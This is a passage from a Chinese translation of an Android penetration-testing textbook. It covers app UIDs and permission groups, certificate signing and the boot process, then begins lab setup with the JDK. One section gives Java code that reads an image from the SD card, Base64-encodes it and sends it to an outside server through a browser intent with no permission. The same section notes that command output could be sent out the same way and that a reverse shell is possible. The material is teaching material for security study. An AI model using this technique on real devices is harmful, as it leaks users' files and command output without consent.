一个正常的 文件看起来像下面的截图所示。 在这里，你可以使
AndroidManifest.xml
用 标记和其他标记查看所需的不同权限：
如前所述，所有 Android 应用程序在安装后首次启动时都会分配一个唯一的 UID。 具有给定
UID 的所有用户都属于特定组，具体取决于他们请求的权限。 例如，一个仅请求 Internet 权
限的应用程序将属于 inet 组，因为 Android 中的 Internet 权限位于 inet 组下。
10
第一章 Android 安全入门
用户（在这种情况下的应用程序）可以属于多个组，具体取决于他们请求的权限。 或者换句
话说，每个用户可以属于多个组，并且每个组可以具有多个用户。 这些组具有由组
ID（GID）定义的唯一名称。 然而，开发人员可以明确地指定其他应用程序在与第一个相同
的 UID 下运行。 在我们的设备中，其中的组和权限在文件 platform.xml 中指定，它位
于 ：
/system/etc/permissions/
shell@grouper:/system/etc/permissions $ cat platform.xml
. . .
. . . [Some of the data has been stripped from here in order to shorten the output an
d make it readable]
此外，这清除了对在 Android 设备中运行的本地应用程序的怀疑。 由于本地应用程序直接与
处理器交互，而不是在 Dalvik 虚拟机下运行，因此它不会以任何方式影响整体安全模型。
现在，就像我们在前面部分看到的，应用程序将其数据存储
在 。 现在，存储应用程序数据的所有文件夹也具有相同
location/data/data/[package name]
的用户 ID，这构成 Android 安全模型的基础。 根据 UID 和文件权限，它将限制来自具有不同
UID 的其他应用程序对它的访问和修改。
在下面的代码示例中， ret 包含以 Base64 格式编码存储在的 SD 卡中的图像，现在正在使
用浏览器调用来上传到 attify.com 网站。 目的只是找到一种方式来在两个不同的 Android 对
象之间进行通信。
我们将首先创建一个对象来存储图像，在 Base64 中编码，最后将其存储在一个字符串
中 ：
imageString
11
第一章 Android 安全入门
final File file = new File("/mnt/sdcard/profile.jpg");
Uri uri = Uri.fromFile(file);
ContentResolver cr = getContentResolver();
Bitmap bMap=null;
try {
InputStream is = cr.openInputStream(uri);
bMap = BitmapFactory.decodeStream(is);
if (is != null) {
is.close();
}
} catch (Exception e) {
Log.e("Error reading file", e.toString());
}
ByteArrayOutputStream baos = new ByteArrayOutputStream();
bMap.compress(Bitmap.CompressFormat.JPEG, 100, baos);
byte[] b = baos.toByteArray();
String imageString = Base64.encodeToString(b,Base64.DEFAULT);
最后，我们将启动浏览器将数据发送到我们的服务器，我们有一个 文件侦听传入的数
.php
据：
startActivity(new Intent(Intent.ACTION_VIEW,Uri.parse("http://attify.com/up.php?u="+im
ageString)));
我们还可以执行命令并以相同的方式将输出发送到远程服务器。 但是，这里需要注意的一点
是 shell 应该在应用程序的用户下运行：
// To execute commands :
String str = "cat /proc/version"; //command to be executed is stored in str.
process = Runtime.getRuntime().exec(str);
这是一个有趣的现象，因为攻击者可以获得一个反向 shell（这是一个从设备到系统的双向连
接，可以用于执行命令），而不需要任何类型的权限。
1.4 应用签名
应用程序签名是 Android 的独特特性之一，由于其开放性和开发人员社区，它取得了成功。
Play 商店中有超过一百万个应用。 在 Android 中，任何人都可以通过下载 Android SDK 创建
Android 应用，然后将其发布到 Play 商店。 通常有两种类型的证书签名机制。 一个是由管理
证书颁发机构（CA）签名的，另一个是自签名证书。 没有中间证书颁发机构（CA），而开
发人员可以创建自己的证书并为应用程序签名。
在 Apple 的 iOS 应用程序模型中可以看到 CA 签名，其中开发者上传到 App Store 的每个应
用程序都经过验证，然后由 Apple 的证书签名。 一旦下载到设备，设备将验证应用程序是否
由 Apple 的 CA 签名，然后才允许应用程序运行。
12
第一章 Android 安全入门
但是，在 Android 中是相反的。 没有证书颁发机构; 而是开发人员的自创建证书可以签署应用
程序。 应用程序上传完成后，会由 Google Bouncer 进行验证，这是一个虚拟环境，用于检
查应用程序是否是恶意或合法的。 检查完成后，应用就会显示在 Play 商店中。 在这种情况
下，Google 不会对该应用程序进行签名。 开发人员可以使用 Android SDK 附带的工具（称
为 keytool ）创建自己的证书，或者使用 Eclipse 的 GUI 创建证书。
因此，在 Android 中，一旦开发人员使用他创建的证书签名了应用程序，他需要将证书的密
钥保存在安全的位置，以防止其他人窃取他的密钥并使用开发人员的证书签署其他应用程序
。
如果我们有一个 Android 应用程序（ .apk ）文件，我们可以检查应用程序的签名，并找到使
用称为 jarsigner 的工具签署应用程序的人，这个工具是 Android SDK 自带的：
$ jarsigner -verify -certs -verbose testing.apk
以下是在应用程序上运行上述命令并获取签名的信息的屏幕截图：
此外，解压缩 .apk 文件后，可以解析 META-INF 文件夹中出现的 CERT.RSA 文件的 ASCII 内
容，以获取签名，如以下命令所示：
$ unzip testing.apk
$ cd META-INF
$ openssl pkcs7 -in CERT.RSA -print_certs -inform DER -out out.cer
$ cat out.cer
这在检测和分析未知的 Android .apk 示例时非常有用。 因此，我们可以使用它获得签署人
以及其他详细信息。
1.5 Android 启动流程
在 Android 中考虑安全性时最重要的事情之一是 Android 启动过程。 整个引导过程从引导加
载程序开始，它会反过来启动 init 过程 - 第一个用户级进程。
所以，任何引导加载程序的变化，或者如果我们加载另一个，而不是默认存在的引导加载程
序，我们实际上可以更改在设备上加载的内容。 引导加载程序通常是特定于供应商的，每个
供应商都有自己的修改版本的引导加载程序。 通常，默认情况下，此功能通过锁定引导加载
程序来禁用，它只允许供应商指定的受信任内核在设备上运行。 为了将自己的 ROM 刷到
Android 设备，需要解锁引导加载程序。 解锁引导加载程序的过程可能因设备而异。 在某些
情况下，它也可能使设备的保修失效。
13
第一章 Android 安全入门
注
在 Nexus 7 中，它就像使用命令行中的 fastboot 工具一样简单，如下所示：
$ fastboot oem unlock
在其他设备中，可能需要更多精力。 我们看看如何创建自己的 Bootloader 并在本书的后续章
节中使用它。
回到启动过程，在引导加载程序启动内核并启动 init 之后，它挂载了 Android 系统运行所需
的一些重要目录，例如 ， 和 。 此外， 从配置文
/dev /sys /proc init
件 和 中获取自己的配置，在某些情况下从位于相同位置
init.rc init.[device-name].rc
的 文件获取自己的配置。
.sh
如果我们对 文件执行 ，我们可以看到 加载自身时使用的所有规范，如下
init.rc cat init
面的截图所示：
14
第一章 Android 安全入门
init 进程的责任是启动其他必需的组件，例如负责 ADB 通信和卷守护程序（vold）的 adb
守护程序（adbd）。
加载时使用的一些属性位于 build.prop ，它位于 location/system 。 当你在 Android 设备上
看到 Android logo 时，就完成了 init 进程的加载。 正如我们在下面的截图中可以看到的，
我们通过检查 文件来获取设备的具体信息：
build.prop
一旦所有的东西被加载， init 最后会加载一个称为 Zygote 的进程，负责以最小空间加载
Dalvik 虚拟机和共享库，来加快整个进程的加载速度。 此外，它继续监听对自己的新调用，
以便在必要时启动更多 DVM。 这是当你在设备上看到 Android 开机动画时的情况。
一旦完全启动，Zygote 派生自己并启动系统，加载其他必要的 Android 组件，如活动管理
器。 一旦完成整个引导过程，系统发送 的广播，许多应用程序可能使用称为
BOOT_COMPLETED
广播接收器的 Android 应用程序中的组件来监听。 当我们在第 3 章“逆向和审计 Android 应用
程序”中分析恶意软件和应用程序时，我们将进一步了解广播接收器。
总结
在本章中，我们为学习 Android渗透测试建立了基础。 我们还了解 Android 的内部结构及其
安全体系结构。
15
第一章 Android 安全入门
在接下来的章节中，我们将建立一个 Android 渗透测试实验室，并使用这些知识执行更多的
技术任务，来渗透 Android 设备和应用程序。 我们还将了解有关 ADB 的更多信息，并使用它
来收集和分析设备中的信息。
16
第二章 准备实验环境
第二章 准备实验环境
作者：Aditya Gupta
译者：飞龙
协议：CC BY-NC-SA 4.0
在上一章中，我们了解了 Android 安全性及其体系结构的基础知识。 在本章中，我们将了解
如何建立 Android 渗透测试实验环境，其中包括下载和配置 Android SDK 和 Eclipse。 我们
将深入了解 ADB，并了解如何创建和配置 Android 虚拟设备（AVD）。
2.1 建立开发环境
为了构建 Android 应用程序或创建 Android 虚拟设备，我们需要配置开发环境，以便运行这
些应用程序。 因此，我们需要做的第一件事是下载 Java 开发工具包（JDK），其中包括
Java 运行时环境（JRE）：
1. 为了下载 JDK，我们需要访
问 ，并根据我们所
http://www.oracle.com/technetwork/java/javase/downloads/index.html
在的平台下载 JDK 7。
就像下载它并运行下载的可执行文件一样简单。 在以下屏幕截图中，你可以看到我的系
统上安装了 Java：
2. 一旦我们下载并安装了 JDK，我们需要在我们的系统上设置环境变量，以便可以从任何
路径执行 Java。
对于 Windows 用户，我们需要右键单击 My Computer （我的电脑）图标，然后选
择 （属性）选项。
Properties
17
第二章 准备实验环境
3. 接下来，我们需要从顶部选项卡列表中选择 Advanced system settings （高级系统设置）
选项：
4. 一旦我们进入了 System Properties （系统属性）对话框，在右下角，我们可以看
到 （环境变量）选项。 当我们点击它，我们可以看到另一个
Environment Variables...
窗口，包含系统变量及其值，在 （系统变量）部分下：
System variables
5. 在新的弹出对话框中，我们需要单击 Variables （变量）下的 PATH 文本框，并键入
Java 安装文件夹的路径：